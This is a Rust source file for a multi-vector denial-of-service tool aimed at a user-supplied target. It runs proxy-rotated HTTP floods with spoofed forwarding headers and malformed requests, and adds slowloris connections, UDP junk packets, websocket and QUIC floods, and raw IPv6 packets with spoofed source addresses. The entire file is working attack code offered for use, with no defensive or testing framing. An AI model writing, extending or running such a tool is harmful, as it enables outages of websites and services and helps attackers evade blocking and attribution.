// nostress_extreme.rs - SINGLE FILE SUPER BRUTAL

use std::{env, sync::Arc, time::{Duration, Instant}};
use reqwest::{Client, Proxy, Method};
use rand::{seq::SliceRandom, Rng};
use tokio::sync::Semaphore;
use futures::stream::{FuturesUnordered, StreamExt};

fn load_file(filename: &str) -> Vec<String> {
    std::fs::read_to_string(filename)
        .unwrap_or_default()
        .lines()
        .filter(|l| !l.trim().is_empty())
        .map(|l| l.trim().to_string())
        .collect()
}
fn pick_random<'a>(list: &'a [String], default: &'a str) -> &'a str {
    list.choose(&mut rand::thread_rng()).map(|s| s.as_str()).unwrap_or(default)
}
fn random_ip() -> String {
    let mut rng = rand::thread_rng();
    format!("{}.{}.{}.{}", rng.gen_range(1..255), rng.gen_range(0..255), rng.gen_range(0..255), rng.gen_range(1..255))
}
fn random_ipv6() -> String {
    let mut rng = rand::thread_rng();
    (0..8)
        .map(|_| format!("{:x}", rng.gen_range(0u16..0xffff)))
        .collect::<Vec<_>>()
        .join(":")
}
fn random_str(len: usize) -> String {
    let mut rng = rand::thread_rng();
    (0..len).map(|_| {
        let c = rng.gen_range(32u8..127u8) as char;
        if rng.gen_bool(0.1) { std::char::from_u32(rng.gen_range(0x1F600..0x1F64F)).unwrap_or(c) } else { c }
    }).collect()
}
fn random_payload() -> Vec<u8> {
    let mut rng = rand::thread_rng();
    let len = rng.gen_range(0..4096);
    (0..len).map(|_| rng.gen::<u8>()).collect()
}
fn random_method() -> String {
    let normal = ["GET","POST","PUT","PATCH","DELETE","HEAD","OPTIONS","TRACE","CONNECT"];
    let weird = ["BREACH","FOOBAR","HACK","BYPASS","XD","🐞","攻撃"];
    let mut all = normal.to_vec();
    all.extend_from_slice(weird);
    all.choose(&mut rand::thread_rng()).unwrap().to_string()
}
fn random_header_case(s: &str) -> String {
    let mut rng = rand::thread_rng();
    s.chars().map(|c| if rng.gen_bool(0.5) { c.to_ascii_uppercase() } else { c.to_ascii_lowercase() }).collect()
}
fn random_path(paths: &[String]) -> String {
    let mut rng = rand::thread_rng();
    let base = paths.choose(&mut rng).cloned().unwrap_or_else(|| "/".to_string());
    let weird = if rng.gen_bool(0.5) {
        format!("{}/{}{}", base.trim_end_matches('/'), random_str(rng.gen_range(1..8)), if rng.gen_bool(0.2) { format!("#{}", random_str(5)) } else { "".to_string() })
    } else { base };
    if rng.gen_bool(0.7) {
        let qs: Vec<String> = (0..rng.gen_range(1..4)).map(|_| format!("{}={}", random_str(3), random_str(6))).collect();
        format!("{}?{}", weird, qs.join("&"))
    } else { weird }
}
fn random_content_type() -> String {
    let types = [
        "application/json", "application/x-www-form-urlencoded", "multipart/form-data",
        "text/plain", "application/xml", "image/png", "application/octet-stream",
        "text/🐞", "x-blackhole", "application/x-unknown"
    ];
    types.choose(&mut rand::thread_rng()).unwrap().to_string()
}
fn random_cookies() -> String {
    let mut rng = rand::thread_rng();
    let count = rng.gen_range(1..6);
    (0..count)
        .map(|_| format!("{}={}", random_str(rng.gen_range(3..7)), random_str(rng.gen_range(5..12))))
        .collect::<Vec<_>>().join("; ")
}
fn random_headers(base: &[(&str, String)]) -> Vec<(String, String)> {
    let mut rng = rand::thread_rng();
    let mut headers = base.iter().map(|(k,v)| (random_header_case(k), v.clone())).collect::<Vec<_>>();
    if rng.gen_bool(0.3) { headers.push((random_header_case("X-BLACKHOLE"), random_str(10))); }
    if rng.gen_bool(0.4) { headers.push((random_header_case("X-RANDOM-SHIT"), random_str(8))); }
    if rng.gen_bool(0.15) && !headers.is_empty() {
        let i = rng.gen_range(0..headers.len());
        headers.push(headers[i].clone());
    }
    if rng.gen_bool(0.1) { headers.push((random_str(5), "\0".to_string())); }
    headers.shuffle(&mut rng);
    headers
}
fn random_http_version() -> &'static str {
    let versions = ["HTTP/1.0", "HTTP/1.1", "HTTP/2", "HTTP/0.9", "HTTP/3.14"];
    versions.choose(&mut rand::thread_rng()).unwrap()
}

// -- RAW TCP SLOWLORIS STYLE --
async fn slowloris_attack(host: &str, port: u16, duration_sec: u64) {
    use tokio::net::TcpStream;
    use tokio::io::AsyncWriteExt;
    let addr = format!("{}:{}", host, port);
    let end = Instant::now() + Duration::from_secs(duration_sec);
    while Instant::now() < end {
        if let Ok(mut stream) = TcpStream::connect(&addr).await {
            let method = random_method();
            let path = random_path(&vec!["/".into()]);
            let headers = format!(
                "{} {} HTTP/1.1\r\nHost: {}\r\nX-SLOW: yes\r\nUser-Agent: {}\r\n\r\n",
                method, path, host, random_str(12)
            );
            for b in headers.bytes() {
                stream.write_all(&[b]).await.ok();
                tokio::time::sleep(tokio::time::Duration::from_millis(rand::thread_rng().gen_range(80..400))).await;
            }
            // Never send body! (slowloris)
            tokio::time::sleep(tokio::time::Duration::from_secs(10)).await;
        }
    }
}

// -- RAW UDP JUNK --
async fn udp_junk(host: &str, port: u16, duration_sec: u64) {
    use tokio::net::UdpSocket;
    let sock = UdpSocket::bind("0.0.0.0:0").await.unwrap();
    let addr = format!("{}:{}", host, port);
    let end = Instant::now() + Duration::from_secs(duration_sec);
    while Instant::now() < end {
        let buf: Vec<u8> = (0..rand::thread_rng().gen_range(40..1200)).map(|_| rand::random::<u8>()).collect();
        let _ = sock.send_to(&buf, &addr).await;
        tokio::time::sleep(tokio::time::Duration::from_millis(rand::thread_rng().gen_range(1..8))).await;
    }
}

// -- WEBSOCKET FLOOD --
async fn websocket_flood(host: &str, duration_sec: u64) {
    use tokio_tungstenite::connect_async;
    use url::Url;
    let end = Instant::now() + Duration::from_secs(duration_sec);
    while Instant::now() < end {
        let wsurl = format!("ws://{}/ws/{}", host, random_str(8));
        let url = Url::parse(&wsurl).unwrap_or_else(|_| Url::parse("ws://127.0.0.1/ws/zero").unwrap());
        let _ = connect_async(url).await;
        tokio::time::sleep(tokio::time::Duration::from_millis(rand::thread_rng().gen_range(9..90))).await;
    }
}

// -- QUIC/HTTP3 FLOOD --
async fn quic_http3_flood(target_host: &str, target_port: u16, duration_sec: u64) {
    use quinn::{ClientConfig, Endpoint};
    use std::net::ToSocketAddrs;
    use tokio::io::AsyncWriteExt;

    let mut endpoint = Endpoint::client("0.0.0.0:0".parse().unwrap()).unwrap();
    endpoint.set_default_client_config(ClientConfig::with_native_roots());
    let server_addr = format!("{}:{}", target_host, target_port)
        .to_socket_addrs().unwrap().next().unwrap();
    let end = Instant::now() + Duration::from_secs(duration_sec);

    while Instant::now() < end {
        if let Ok(conn) = tokio::time::timeout(Duration::from_secs(2), endpoint.connect(server_addr, target_host)).await {
            if let Ok(c) = conn {
                for _ in 0..5 {
                    let req = b"GET / HTTP/3\r\nhost: test\r\n\r\n";
                    let _ = c.open_uni().await.and_then(|mut s| async move {
                        s.write_all(req).await?;
                        s.finish().await
                    }).await;
                }
            }
        }
        tokio::time::sleep(tokio::time::Duration::from_millis(rand::thread_rng().gen_range(10..50))).await;
    }
}

// -- RAW IPV6 SPOOF --
fn raw_ipv6_spoof(target: &str, duration_sec: u64) {
    use pnet::transport::{transport_channel, TransportChannelType::Layer3};
    use pnet::packet::ipv6::MutableIpv6Packet;
    use std::net::Ipv6Addr;
    use std::str::FromStr;

    let protocol = Layer3(pnet::packet::ip::IpNextHeaderProtocols::Tcp);
    let (mut tx, _) = transport_channel(4096, protocol).unwrap();
    let end = Instant::now() + std::time::Duration::from_secs(duration_sec);
    let dst = Ipv6Addr::from_str(target).unwrap_or(Ipv6Addr::LOCALHOST);

    while Instant::now() < end {
        let mut buffer = [0u8; 64];
        let mut packet = MutableIpv6Packet::new(&mut buffer).unwrap();
        let src_ip = random_ipv6();
        packet.set_source(Ipv6Addr::from_str(&src_ip).unwrap_or(Ipv6Addr::LOCALHOST));
        packet.set_destination(dst);
        packet.set_hop_limit(64);
        packet.set_next_header(pnet::packet::ip::IpNextHeaderProtocols::Tcp);
        packet.set_payload(b"GET / HTTP/1.1\r\nHost: test\r\n\r\n");
        let _ = tx.send_to(packet, std::net::IpAddr::V6(dst));
    }
}

#[tokio::main]
async fn main() {
    let args: Vec<String> = env::args().collect();
    if args.len() < 5 {
        eprintln!("Usage: {} [rps] [threads] [proxies.txt] [target]", args[0]);
        std::process::exit(1);
    }
    let rps: usize = args[1].parse().unwrap();
    let threads: usize = args[2].parse().unwrap();
    let proxyfile = &args[3];
    let target = &args[4];
    let duration_sec = 45;

    // Load all lists
    let proxies = Arc::new(load_file(proxyfile));
    let referers = Arc::new(load_file("referers.txt"));
    let useragents = Arc::new(load_file("useragents.txt"));
    let ciphers = Arc::new(load_file("ciphers.txt"));
    let sigalgs = Arc::new(load_file("sigalgs.txt"));
    let paths = Arc::new(load_file("paths.txt"));
    let langs = Arc::new(load_file("lang_header.txt"));
    let accepts = Arc::new(load_file("accept_header.txt"));
    let encodings = Arc::new(load_file("encoding_header.txt"));
    let controles = Arc::new(load_file("controle_header.txt"));

    let client_base = Arc::new(
        Client::builder()
            .pool_idle_timeout(Duration::from_secs(60))
            .danger_accept_invalid_certs(true)
            .tcp_nodelay(true)
            .build()
            .unwrap()
    );
    let semaphore = Arc::new(Semaphore::new(threads));
    let start = Instant::now();

    let mut handles = Vec::with_capacity(threads + 5);

    // -- Brutal async HTTP flood --
    for _ in 0..threads {
        let (paths, proxies, referers, useragents, ciphers, sigalgs, langs, accepts, encodings, controles) =
            (Arc::clone(&paths), Arc::clone(&proxies), Arc::clone(&referers), Arc::clone(&useragents),
            Arc::clone(&ciphers), Arc::clone(&sigalgs), Arc::clone(&langs), Arc::clone(&accepts),
            Arc::clone(&encodings), Arc::clone(&controles));
        let target = target.to_string();
        let client_base = Arc::clone(&client_base);
        let semaphore = Arc::clone(&semaphore);

        handles.push(tokio::spawn(async move {
            let _permit = semaphore.acquire().await.unwrap();
            let rps_per_thread = rps / threads.max(1);
            while start.elapsed().as_secs() < duration_sec {
                let mut batch = FuturesUnordered::new();
                for _ in 0..rps_per_thread.max(1) {
                    let client = if !proxies.is_empty() {
                        let proxy = pick_random(&proxies, "");
                        let proxy_addr = if proxy.starts_with("http") || proxy.starts_with("socks") {
                            proxy.to_string()
                        } else {
                            format!("http://{}", proxy)
                        };
                        if !proxy.is_empty() {
                            Arc::new(
                                Client::builder()
                                    .danger_accept_invalid_certs(true)
                                    .proxy(Proxy::all(&proxy_addr).unwrap())
                                    .build()
                                    .unwrap()
                            )
                        } else { Arc::clone(&client_base) }
                    } else { Arc::clone(&client_base) };

                    let mut rng = rand::thread_rng();
                    let path = random_path(&paths);
                    let url = format!("{}{}", target, path);
                    let user_agent = pick_random(&useragents, "Mozilla/5.0").to_string();
                    let referer = pick_random(&referers, "https://google.com").to_string();
                    let cipher = pick_random(&ciphers, "TLS_AES_128_GCM_SHA256").to_string();
                    let sigalg = pick_random(&sigalgs, "ecdsa_secp256r1_sha256").to_string();
                    let lang = pick_random(&langs, "en-US,en;q=0.5").to_string();
                    let accept = pick_random(&accepts, "*/*").to_string();
                    let encoding = pick_random(&encodings, "gzip, deflate, br").to_string();
                    let controle = pick_random(&controles, "no-cache").to_string();
                    let fake_ip = random_ip();
                    let cookies = random_cookies();
                    let content_type = random_content_type();

                    let mut base_headers = vec![
                        ("User-Agent", user_agent),
                        ("Referer", referer),
                        ("X-Forwarded-For", fake_ip.clone()),
                        ("X-Real-IP", fake_ip),
                        ("Accept", accept),
                        ("Accept-Encoding", encoding),
                        ("Accept-Language", lang),
                        ("Cache-Control", controle),
                        ("TLS-Cipher", cipher),
                        ("TLS-SigAlg", sigalg),
                        ("Cookie", cookies),
                        ("Content-Type", content_type.clone()),
                        ("Connection", if rng.gen_bool(0.5) { "close".into() } else { "keep-alive".into() }),
                        ("X-HTTP-Version", random_http_version().into()),
                    ];
                    let headers = random_headers(&base_headers);

                    let method_str = random_method();
                    let method = Method::from_bytes(method_str.as_bytes()).unwrap_or(Method::GET);
                    let mut req = client.request(method.clone(), &url)
                        .timeout(Duration::from_secs(7));
                    for (k,v) in headers {
                        req = req.header(k, v);
                    }

                    let mut do_body = false;
                    if ["POST","PUT","PATCH","DELETE","BREACH","FOOBAR","HACK"].contains(&method_str.as_str()) || rng.gen_bool(0.4) {
                        do_body = true;
                    }
                    if do_body {
                        if content_type.contains("multipart") && rng.gen_bool(0.5) {
                            let mut form = reqwest::multipart::Form::new();
                            let field_count = rng.gen_range(1..5);
                            for _ in 0..field_count {
                                let field_name = random_str(rng.gen_range(3..8));
                                let field_val = random_str(rng.gen_range(10..20));
                                form = form.text(field_name, field_val);
                            }
                            req = req.multipart(form);
                        } else if rng.gen_bool(0.3) {
                            let emojibody: String = (0..rng.gen_range(10..100)).map(|_| char::from_u32(rng.gen_range(0x1F600..0x1F64F)).unwrap_or('x')).collect();
                            req = req.body(emojibody);
                        } else if rng.gen_bool(0.3) {
                            req = req.body(random_payload());
                        } else if rng.gen_bool(0.2) {
                            req = req.body("");
                        } else {
                            req = req.body(random_str(rng.gen_range(15..100)));
                        }
                    }

                    if rng.gen_bool(0.1) {
                        req = req.header("Content-Length", "");
                    }
                    if rng.gen_bool(0.1) {
                        req = req.header("Transfer-Encoding", "chunked, identity, gzip");
                    }
                    if rng.gen_bool(0.6) {
                        let delay = rng.gen_range(0..15);
                        if delay > 0 { tokio::time::sleep(tokio::time::Duration::from_millis(delay)).await; }
                    }
                    batch.push(req.send());
                }
                while let Some(_res) = batch.next().await {}
            }
        }));
    }

    // -- RAW TCP SLOWLORIS/FRAGMENTED (ultra gila), UDP, WebSocket, QUIC/HTTP3, RAW IPV6 SPOOF
    if let Ok(url) = url::Url::parse(target) {
        if let Some(host) = url.host_str() {
            let port = url.port_or_known_default().unwrap_or(80);
            handles.push(tokio::spawn(slowloris_attack(host, port, duration_sec)));
            handles.push(tokio::spawn(udp_junk(host, port, duration_sec)));
            handles.push(tokio::spawn(websocket_flood(host, duration_sec)));
            // QUIC/HTTP3 flood (port 443)
            handles.push(tokio::spawn(quic_http3_flood(host, 443, duration_sec)));

            // RAW IPV6 spoof (hanya jika host IPv6)
            if host.contains(":") {
                let h = host.to_string();
                std::thread::spawn(move || raw_ipv6_spoof(&h, duration_sec));
            }
        }
    }

    for h in handles {
        let _ = h.await;
    }
    println!("SELESAI (LEVEL GILA SUPREME)!");
}